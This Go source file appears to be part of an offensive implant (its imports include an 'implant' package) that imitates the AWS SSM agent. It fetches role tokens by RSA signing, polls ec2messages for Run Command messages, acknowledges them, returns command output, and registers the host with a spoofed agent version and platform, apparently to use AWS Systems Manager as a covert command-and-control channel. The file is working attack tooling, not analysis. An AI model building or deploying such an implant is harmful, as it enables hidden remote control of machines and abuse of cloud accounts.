package awsssm

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/aws/amazon-ssm-agent/agent/contracts"
	"github.com/grines/ssmmm/awsauth"
	"github.com/grines/ssmmm/awsrsa"
	"github.com/grines/ssmmm/implant/wd"
)

type SendCommandPayload struct {
	Parameters              map[string]interface{}    `json:"Parameters"`
	DocumentContent         contracts.DocumentContent `json:"DocumentContent"`
	CommandID               string                    `json:"CommandId"`
	DocumentName            string                    `json:"DocumentName"`
	OutputS3KeyPrefix       string                    `json:"OutputS3KeyPrefix"`
	OutputS3BucketName      string                    `json:"OutputS3BucketName"`
	CloudWatchLogGroupName  string                    `json:"CloudWatchLogGroupName"`
	CloudWatchOutputEnabled string                    `json:"CloudWatchOutputEnabled"`
}

type InstanceInformation struct {
	InstanceInformationList []struct {
		ActivationID        string `json:"ActivationId"`
		AgentVersion        string `json:"AgentVersion"`
		AssociationOverview struct {
			DetailedStatus                           string `json:"DetailedStatus"`
			InstanceAssociationStatusAggregatedCount struct {
				Failed  int `json:"Failed"`
				Success int `json:"Success"`
			} `json:"InstanceAssociationStatusAggregatedCount"`
		} `json:"AssociationOverview"`
		AssociationStatus            string  `json:"AssociationStatus"`
		ComputerName                 string  `json:"ComputerName"`
		IPAddress                    string  `json:"IPAddress"`
		IamRole                      string  `json:"IamRole"`
		InstanceID                   string  `json:"InstanceId"`
		IsLatestVersion              bool    `json:"IsLatestVersion"`
		LastAssociationExecutionDate float64 `json:"LastAssociationExecutionDate"`
		LastPingDateTime             float64 `json:"LastPingDateTime"`
		PingStatus                   string  `json:"PingStatus"`
		PlatformName                 string  `json:"PlatformName"`
		PlatformType                 string  `json:"PlatformType"`
		PlatformVersion              string  `json:"PlatformVersion"`
		RegistrationDate             float64 `json:"RegistrationDate"`
		ResourceType                 string  `json:"ResourceType"`
	} `json:"InstanceInformationList"`
}

func GetRoleTokenFromRSA(managedInstanceID string, publicKey string, instanceRegion string, fingerPrint string) (awsrsa.AwsToken, error) {
	var data awsrsa.AwsToken

	signer := awsrsa.BuildRsaSigner(managedInstanceID, publicKey, "AmazonSSM.RequestManagedInstanceRoleToken", "ssm", instanceRegion, time.Now(), 0, `{"Fingerprint":"`+fingerPrint+`"}`)
	signer.SignRsa()

	client := &http.Client{}
	resp, err := client.Do(signer.Request)
	if err != nil {
		return data, err
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	err = decoder.Decode(&data)
	if err != nil {
		return data, err
	}
	return data, err
}

func GetRunCommandMessages(tokens awsrsa.AwsToken, managedInstanceID string, instanceRegion string) (awsrsa.DocMessage, error) {
	var data awsrsa.DocMessage

	req, body := awsauth.BuildRequest("ec2messages", instanceRegion, `{"Destination":"`+managedInstanceID+`","MessagesRequestId":"`+awsrsa.UniqueID()+`","VisibilityTimeoutInSeconds":10}`, "EC2WindowsMessageDeliveryService.GetMessages")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", instanceRegion, 0, time.Now())

	client := http.Client{
		Timeout: 2 * time.Second,
	}
	resp, err := client.Do(req)
	if err != nil {
		return data, err
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	decoder.Decode(&data)
	return data, err
}

func SendCommandOutput(tokens awsrsa.AwsToken, managedInstanceID string, cmdID string, cmdOutput string, instanceRegion string) string {
	req, body := awsauth.BuildRequest("ec2messages", instanceRegion, `{"MessageId":"aws.ssm.`+cmdID+`.`+managedInstanceID+`","Payload":"{\"additionalInfo\":{\"agent\":{\"lang\":\"en-US\",\"name\":\"amazon-ssm-agent\",\"os\":\"\",\"osver\":\"1\",\"ver\":\"3.1.0.0\"},\"dateTime\":\"2022-01-13T00:30:25.818Z\",\"runId\":\"\",\"runtimeStatusCounts\":{\"Success\":1}},\"documentStatus\":\"Success\",\"documentTraceOutput\":\"\",\"runtimeStatus\":{\"aws:runShellScript\":{\"status\":\"Success\",\"code\":0,\"name\":\"aws:runShellScript\",\"output\":\"none\\n\",\"startDateTime\":\"2022-01-13T00:30:25.268Z\",\"endDateTime\":\"2022-01-13T00:30:25.385Z\",\"outputS3BucketName\":\"\",\"outputS3KeyPrefix\":\"\",\"stepName\":\"\",\"standardOutput\":\"`+cmdOutput+`\\n\",\"standardError\":\"\"}}}","ReplyId":"`+awsrsa.UniqueID()+`"}`, "EC2WindowsMessageDeliveryService.SendReply")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", instanceRegion, 0, time.Now())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"
}

func AcknowledgeCommand(tokens awsrsa.AwsToken, managedInstanceID string, cmdID string, instanceRegion string) string {
	req, body := awsauth.BuildRequest("ec2messages", instanceRegion, `{"MessageId":"aws.ssm.`+cmdID+`.`+managedInstanceID+`"}`, "EC2WindowsMessageDeliveryService.AcknowledgeMessage")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ec2messages", instanceRegion, 0, time.Now())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"

}

func GetOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return net.IP(err.Error())
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func UpdateInstanceInformation(tokens awsrsa.AwsToken, managedInstanceID string, instanceRegion string) string {
	hostname, _ := os.Hostname()
	localip := GetLocalIP()

	req, body := awsauth.BuildRequest("ssm", instanceRegion, `{"AgentName":"amazon-ssm-agent","AgentStatus":"Active","AgentVersion":"3.1.0.0","ComputerName":"`+hostname+`","IPAddress":"`+localip+`","InstanceId":"`+managedInstanceID+`","PlatformName":"`+wd.WorkingDir()+`","PlatformType":"MacOS","PlatformVersion":"11.6"}`, "AmazonSSM.UpdateInstanceInformation")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ssm", instanceRegion, 0, time.Now())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "error"
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	var data awsrsa.DocMessage
	decoder.Decode(&data)
	return "OK"

}

func GetInstanceInformation(tokens awsrsa.AwsToken, managedInstanceID string, instanceRegion string) InstanceInformation {
	var data InstanceInformation

	req, body := awsauth.BuildRequest("ssm", instanceRegion, `{"Filters": [{"Key": "InstanceIds", "Values": ["`+managedInstanceID+`"]}]}`, "AmazonSSM.DescribeInstanceInformation")

	signer := awsauth.BuildSigner(tokens.AccessKeyID, tokens.SecretAccessKey, tokens.SessionToken)
	signer.Presign(req, body, "ssm", instanceRegion, 0, time.Now())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return data
	}
	defer resp.Body.Close()

	decoder := json.NewDecoder(resp.Body)
	decoder.Decode(&data)
	fmt.Println(data)
	return data

}
